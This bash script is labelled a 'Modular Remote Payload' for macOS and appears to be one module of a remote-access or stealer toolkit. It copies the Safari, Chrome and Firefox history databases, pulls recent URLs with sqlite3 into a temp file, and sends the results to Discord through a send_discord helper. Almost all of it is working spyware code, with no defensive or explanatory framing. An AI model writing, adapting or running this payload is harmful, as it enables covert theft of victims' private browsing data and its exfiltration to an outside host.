#!/bin/bash
# ============================================================
# Browser History for macOS - Modular Remote Payload
# ============================================================
# Extracts browser history from Safari and Chrome
# ============================================================

SYSID=$(get_sysid)
OUTPUT="🌐 **Browser History from $SYSID**\n"
OUTPUT+="📅 $(date '+%Y-%m-%d %H:%M:%S')\n"
OUTPUT+="========================================\n\n"

TMPFILE="/tmp/history_$SYSID.txt"
echo "Browser History Export - $SYSID" > "$TMPFILE"
echo "Generated: $(date)" >> "$TMPFILE"
echo "========================================" >> "$TMPFILE"

# Safari History
SAFARI_DB="$HOME/Library/Safari/History.db"
if [[ -f "$SAFARI_DB" ]]; then
    OUTPUT+="**🧭 SAFARI**\n"
    # Copy to temp to avoid lock issues
    cp "$SAFARI_DB" /tmp/safari_history.db 2>/dev/null
    if command -v sqlite3 &>/dev/null; then
        SAFARI_COUNT=$(sqlite3 /tmp/safari_history.db "SELECT COUNT(*) FROM history_items" 2>/dev/null)
        OUTPUT+="• Total entries: \`$SAFARI_COUNT\`\n"
        OUTPUT+="• Recent sites:\n"
        
        echo -e "\n\n=== SAFARI HISTORY ===" >> "$TMPFILE"
        sqlite3 /tmp/safari_history.db "SELECT datetime(visit_time + 978307200, 'unixepoch', 'localtime') as date, url FROM history_visits INNER JOIN history_items ON history_visits.history_item = history_items.id ORDER BY visit_time DESC LIMIT 50" 2>/dev/null >> "$TMPFILE"
        
        # Show last 5 in Discord
        sqlite3 /tmp/safari_history.db "SELECT url FROM history_visits INNER JOIN history_items ON history_visits.history_item = history_items.id ORDER BY visit_time DESC LIMIT 5" 2>/dev/null | while read url; do
            OUTPUT+="  \`$url\`\n"
        done
    fi
    rm -f /tmp/safari_history.db
    OUTPUT+="\n"
fi

# Chrome History
CHROME_DB="$HOME/Library/Application Support/Google/Chrome/Default/History"
if [[ -f "$CHROME_DB" ]]; then
    OUTPUT+="**🔵 CHROME**\n"
    cp "$CHROME_DB" /tmp/chrome_history.db 2>/dev/null
    if command -v sqlite3 &>/dev/null; then
        CHROME_COUNT=$(sqlite3 /tmp/chrome_history.db "SELECT COUNT(*) FROM urls" 2>/dev/null)
        OUTPUT+="• Total entries: \`$CHROME_COUNT\`\n"
        OUTPUT+="• Recent sites:\n"
        
        echo -e "\n\n=== CHROME HISTORY ===" >> "$TMPFILE"
        sqlite3 /tmp/chrome_history.db "SELECT datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') as date, url FROM urls ORDER BY last_visit_time DESC LIMIT 50" 2>/dev/null >> "$TMPFILE"
        
        sqlite3 /tmp/chrome_history.db "SELECT url FROM urls ORDER BY last_visit_time DESC LIMIT 5" 2>/dev/null | while read url; do
            OUTPUT+="  \`$url\`\n"
        done
    fi
    rm -f /tmp/chrome_history.db
    OUTPUT+="\n"
fi

# Firefox History
FIREFOX_DIR="$HOME/Library/Application Support/Firefox/Profiles"
if [[ -d "$FIREFOX_DIR" ]]; then
    OUTPUT+="**🦊 FIREFOX**\n"
    for profile in "$FIREFOX_DIR"/*.default*; do
        if [[ -f "$profile/places.sqlite" ]]; then
            cp "$profile/places.sqlite" /tmp/firefox_history.db 2>/dev/null
            if command -v sqlite3 &>/dev/null; then
                FF_COUNT=$(sqlite3 /tmp/firefox_history.db "SELECT COUNT(*) FROM moz_places" 2>/dev/null)
                OUTPUT+="• Total entries: \`$FF_COUNT\`\n"
                
                echo -e "\n\n=== FIREFOX HISTORY ===" >> "$TMPFILE"
                sqlite3 /tmp/firefox_history.db "SELECT datetime(last_visit_date/1000000, 'unixepoch', 'localtime') as date, url FROM moz_places WHERE last_visit_date IS NOT NULL ORDER BY last_visit_date DESC LIMIT 50" 2>/dev/null >> "$TMPFILE"
            fi
            rm -f /tmp/firefox_history.db
            break
        fi
    done
    OUTPUT+="\n"
fi

send_discord "$OUTPUT" "$TMPFILE"
rm -f "$TMPFILE"

